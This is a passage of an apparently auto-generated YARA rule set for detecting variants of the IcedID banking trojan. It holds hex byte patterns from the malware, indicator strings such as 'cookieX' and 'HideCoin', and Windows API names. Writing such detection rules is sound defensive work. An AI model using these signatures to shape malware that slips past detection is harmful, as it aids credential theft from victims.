        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {8b 45 40 b9 ab 01 00 00 2b c8 8b 45 40 2b c8 83 c1 2b 89 4d 40 8a 45 48 88 02}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_7_1 = {8b 4d fc ba 4f ec c4 4e 89 c8 f7 ea c1 fa 04 89 c8 c1 f8 1f 29 c2 89 d0 6b c0 34 29 c1 89 c8}  //weight: 7, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_6_1 = {ff c2 41 8b cd 49 81 c8 1f 21 af 04 48 63 c2 48 81 f1 d2 3b 00 00 4c 89 83 00 02 00 00 48 3b c1 72 de}  //weight: 6, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_8_1 = {48 89 54 24 10 48 89 4c 24 08 eb 1b 80 44 24 40 5a c6 44 24 41 4b eb b8 80 44 24 46 30 c6 44 24 47 22 e9 6d ff ff ff}  //weight: 8, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ygagihsfgyukasjhgyjas" ascii //weight: 10
        $x_1_2 = {10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_8_1 = {e9 50 fc ff ff 66 89 84 24 8e 00 00 00 b8 15 00 00 00 eb 00 83 c0 5b 66 89 84 24 90 00 00 00 eb 17 83 c0 2c 66 89 84 24 8c 00 00 00 eb 00 b8 3c 00 00 00 83 c0 33 eb cd}  //weight: 8, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mkajdsasd" ascii //weight: 1
        $x_1_2 = "HideCoin" ascii //weight: 1
        $x_1_3 = "cookieX" ascii //weight: 1
        $x_1_4 = "offlineic" ascii //weight: 1
        $x_1_5 = "email|seLoading" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MhHkDOPAWDM" ascii //weight: 1
        $x_1_2 = "PAiVhgDeyOc" ascii //weight: 1
        $x_1_3 = "PluginInit" ascii //weight: 1
        $x_1_4 = "QKgKUNesBnvUxd" ascii //weight: 1
        $x_1_5 = "RbYburBSSkPkJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_9
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "uaisdnhasdiakjsdnaiss" ascii //weight: 1
        $x_1_2 = "WaitForSingleObject" ascii //weight: 1
        $x_1_3 = "CreateEventW" ascii //weight: 1
        $x_1_4 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_10
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HuJTQzqcrcBloVM" ascii //weight: 1
        $x_1_2 = "Jbadsjasfks" ascii //weight: 1
        $x_1_3 = "faqRjGHbayufGU" ascii //weight: 1
        $x_1_4 = "GetMenuItemInfoA" ascii //weight: 1
        $x_1_5 = "ReleaseDC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_11
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_8_1 = {44 89 4c 24 20 4c 89 44 24 18 eb aa 80 44 24 44 67 c6 44 24 45 27 eb aa 80 44 24 46 13 c6 44 24 47 37 e9 e5 fe ff ff 48 8d 94 24 88 00 00 00 48 8b 4c 24 38 e9 49 fd ff ff 44 8b 4c 24 60 4c 8d 84 24 80 00 00 00 eb df b8 01 00 00 00 83 c0 00 eb 38}  //weight: 8, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_12
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "yguasdmaiusdhyagsunmjuiashyd" ascii //weight: 5
        $x_5_2 = "ygihasnhfuyasfjnashuydjasdna" ascii //weight: 5
        $x_1_3 = "WaitForSingleObject" ascii //weight: 1
        $x_1_4 = "CreateEventW" ascii //weight: 1
        $x_1_5 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EB_2147830238_13
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "aayusdghijasojifuhygahsjdkasas" ascii //weight: 5
        $x_5_2 = "ayusdhiodsfuioisdofjgdoidgoijs" ascii //weight: 5
        $x_1_3 = "OpenProcess" ascii //weight: 1
        $x_1_4 = "GetCurrentProcessId" ascii //weight: 1
        $x_1_5 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EB_2147830238_14
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "unkjadsuhyagfsbdhajdjaisufhajs" ascii //weight: 5
        $x_5_2 = "yiuanjuighydsijksakidsjufjkdss" ascii //weight: 5
        $x_1_3 = "DuplicateHandle" ascii //weight: 1
        $x_1_4 = "GetCurrentProcess" ascii //weight: 1
        $x_1_5 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EB_2147830238_15
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "libgd.dll" ascii //weight: 10
        $x_1_2 = "hD_COLOR_MAP_X11" ascii //weight: 1
        $x_1_3 = "hZN2GD5Image10CreateFromEP6_iobuf" ascii //weight: 1
        $x_1_4 = "hZN2GD5Image10CreateFromERSi" ascii //weight: 1
        $x_1_5 = "hZN2GD5Image10CreateFromEiPv" ascii //weight: 1
        $x_1_6 = "hdAffineApplyToPointF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_16
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "bhunnnnduahsdiojasdygajakss" ascii //weight: 5
        $x_5_2 = "tyuijiasdjuasjdaksdasa" ascii //weight: 5
        $x_5_3 = "tnsjuyagsdbhjngjifomajduahy" ascii //weight: 5
        $x_5_4 = "duginjasuhygufaijasnfhyuash" ascii //weight: 5
        $x_1_5 = "WaitForSingleObject" ascii //weight: 1
        $x_1_6 = "CreateEvent" ascii //weight: 1
        $x_1_7 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EB_2147830238_17
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "TBSyMnc.dll" ascii //weight: 10
        $x_10_2 = "CZXZAPm.dll" ascii //weight: 10
        $x_1_3 = "hDICT_addEntropyTablesFromBuffer" ascii //weight: 1
        $x_1_4 = "hDICT_finalizeDictionary" ascii //weight: 1
        $x_1_5 = "hSTD_DCtx_getParameter" ascii //weight: 1
        $x_1_6 = "hSTD_DCtx_loadDictionary" ascii //weight: 1
        $x_1_7 = "VirtualProtect" ascii //weight: 1
        $x_1_8 = "VirtualQuery" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 6 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_EB_2147830238_18
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sdyGallery).162uaboutbluearefirstl" wide //weight: 1
        $x_1_2 = "0usesit0" wide //weight: 1
        $x_1_3 = "vbrowsersQbut" wide //weight: 1
        $x_1_4 = "scores59precisehjpageon" wide //weight: 1
        $x_1_5 = "jJIhomevinprince14" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EB_2147830238_19
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EB!MTB"
        threat_id = "2147830238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\bin\\WiX\\Test\\test.cs" wide //weight: 1
        $x_1_2 = "test.cs.dll" wide //weight: 1
        $x_1_3 = "zzzzInvokeManagedCustomActionOutOfProc" wide //weight: 1
        $x_1_4 = "test.cs!XXX.YyY.ZzZ" wide //weight: 1
        $x_1_5 = "RemoteMsiSession" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AU_2147830239_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AU!MTB"
        threat_id = "2147830239"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BTNkq5uRyHHTAPEHGw42jQjN" ascii //weight: 1
        $x_1_2 = "BZuwGDyQnF5WmxyZ0" ascii //weight: 1
        $x_1_3 = "GXxmButfhZfkZAwgVHNNEG" ascii //weight: 1
        $x_1_4 = "GfbZNkBElWPE2p1ZXLNUC1y79vhP" ascii //weight: 1
        $x_1_5 = "In3VQGIjLxvR6gu4NLdHYvKgLdH8S" ascii //weight: 1
        $x_1_6 = "KvnfI2OhDcHDZBDK88sF6n29mk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AV_2147830310_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AV!MTB"
        threat_id = "2147830310"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ygagkasjfhuashfjkasjash" ascii //weight: 1
        $x_1_2 = "GD5bN1MK0Lh" ascii //weight: 1
        $x_1_3 = "VYumxKbs3" ascii //weight: 1
        $x_1_4 = "Wp2CbXASMM" ascii //weight: 1
        $x_1_5 = "Ws1rDgF7Wu" ascii //weight: 1
        $x_1_6 = "cLQjTv9K9W9" ascii //weight: 1
        $x_1_7 = "fuI3LRZ30qz" ascii //weight: 1
        $x_1_8 = "gLtTuiY3TT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAX_2147830315_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAX!MTB"
        threat_id = "2147830315"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {48 89 84 24 80 00 00 00 48 8b 84 24 80 00 00 00 e9 ?? ?? ?? ?? 33 c0 e9 ?? ?? ?? ?? 8b 84 24 94 00 00 00 e9 ?? ?? ?? ?? 48 8b 8c 24 48 01 00 00 48 3b c8 74 ?? eb ?? 48 8b 84 24 30 01 00 00 48 89 84 24 58 01 00 00 e9 ?? ?? ?? ?? 41 8a 04 00 88 04 0a e9}  //weight: 5, accuracy: Low
        $x_1_2 = "ygagkasjfhuashfjkasjash" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_H_2147830496_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.H!MTB"
        threat_id = "2147830496"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {48 8b 44 24 08 48 ff c0 66 3b ff 74 4c 88 08 48 8b 04 24 66 3b d2 74 1a 48 8b 44 24 20 48 89 04 24 66 3b c0 74 3f 48 8b 4c 24 08 8a 09 66 3b ff 74 db}  //weight: 3, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_H_2147830496_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.H!MTB"
        threat_id = "2147830496"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {48 8b 44 24 38 66 3b d2 74 1d 44 89 4c 24 20 4c 89 44 24 18 3a f6 74 00 48 89 54 24 10 48 89 4c 24 08 66 3b f6 74 20}  //weight: 2, accuracy: High
        $x_1_2 = "fahgdagyusdajsdkas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_H_2147830496_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.H!MTB"
        threat_id = "2147830496"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {b8 5d 00 00 00 83 c0 08 66 3b ed 74 ba 83 c0 29 66 89 44 24 52 66 3b c0 74 00 33 c0 66 89 44 24 54 66 3b f6 74 43 b8 05 00 00 00 83 c0 2e 66 3b d2 74 27}  //weight: 2, accuracy: High
        $x_1_2 = "ygasbdjkbsydujhaksdasds" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ED_2147830504_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ED!MTB"
        threat_id = "2147830504"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_8_1 = {89 c8 c1 f8 1f 01 ca c1 fa 04 29 c2 89 c8 0f af d5 29 d0 48 63 d0 41 0f b6 14 10 41 32 14 0b 41 88 14 09}  //weight: 8, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ED_2147830504_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ED!MTB"
        threat_id = "2147830504"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "yaretdjbkasvdajasd" ascii //weight: 10
        $x_1_2 = {10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAY_2147830605_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAY!MTB"
        threat_id = "2147830605"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ujyhgsadafghjhkjgga" ascii //weight: 10
        $x_1_2 = {f0 00 22 20 0b 02 02 0e 00 90 00 00 00 b4 05 00 00 00 00 00 00 00 00 00 00 10}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AX_2147830618_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AX!MTB"
        threat_id = "2147830618"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 94 24 ?? ?? ?? ?? 88 04 0a e9 ?? ?? ?? ?? e9 ?? ?? ?? ?? 66 89 44 24 ?? b8 ?? ?? ?? ?? eb ?? 8b c2 8b c0 eb ?? 8b 04 24 f7 b4 24 ?? ?? ?? ?? eb ?? 8b 4c 24 ?? 33 c8 eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AX_2147830618_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AX!MTB"
        threat_id = "2147830618"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BQyNH9" ascii //weight: 1
        $x_1_2 = "BPKHRWxIHM" ascii //weight: 1
        $x_1_3 = "C9hQduWUa" ascii //weight: 1
        $x_1_4 = "F4KQ4AUHpQ" ascii //weight: 1
        $x_1_5 = "FOOfZ3i8" ascii //weight: 1
        $x_1_6 = "yatsdghasygudtahjsjdas" ascii //weight: 1
        $x_1_7 = "GUOmcXxN" ascii //weight: 1
        $x_1_8 = "HGrWPup" ascii //weight: 1
        $x_1_9 = "LSNBLs5" ascii //weight: 1
        $x_1_10 = "OKc3xoZ8HR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win64_IcedID_GG_2147830671_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GG!MTB"
        threat_id = "2147830671"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {44 89 4c 24 20 4c 89 44 24 18 66 3b c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AY_2147830706_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AY!MTB"
        threat_id = "2147830706"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c1 89 05 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 8b 89 ?? ?? ?? ?? 8b 40 ?? 33 c1 35 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? 8b 49 ?? 2b c8 8b c1 48 ?? ?? ?? ?? ?? ?? 89 41 ?? e9 ?? ?? ?? ?? b8 ?? ?? ?? ?? 48 ?? ?? ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AY_2147830706_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AY!MTB"
        threat_id = "2147830706"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BGrHhiIWj" ascii //weight: 1
        $x_1_2 = "BiD1daGSgVi" ascii //weight: 1
        $x_1_3 = "GEGfBNGYWYm" ascii //weight: 1
        $x_1_4 = "HCj3oREn" ascii //weight: 1
        $x_1_5 = "J0QEIV0VNC" ascii //weight: 1
        $x_1_6 = "BIdTtXaUyNK" ascii //weight: 1
        $x_1_7 = "DrHb94sebyv" ascii //weight: 1
        $x_1_8 = "I8vMURrPMLi" ascii //weight: 1
        $x_1_9 = "K7qogNJ4zBY" ascii //weight: 1
        $x_1_10 = "KREVMYgbfTC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win64_IcedID_NX_2147830737_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NX!MTB"
        threat_id = "2147830737"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VfugdshfjhgyUAShjashgyusjaf" ascii //weight: 1
        $x_1_2 = "ABrRj7DdSTypcDhV6RS" ascii //weight: 1
        $x_1_3 = "BtOmNTYawkbqVaLgLOxmr8ZoE" ascii //weight: 1
        $x_1_4 = "BtViiYvIHGmdwbeqgyN" ascii //weight: 1
        $x_1_5 = "FyzUw8tosi7JmzSd9KypDnF5bb" ascii //weight: 1
        $x_1_6 = "FUUTT3AorDJhMNzdNjle8G" ascii //weight: 1
        $x_1_7 = "xUzzHrcegGZOcZWBUY4x90c1eJAVby" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAZ_2147830910_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAZ!MTB"
        threat_id = "2147830910"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
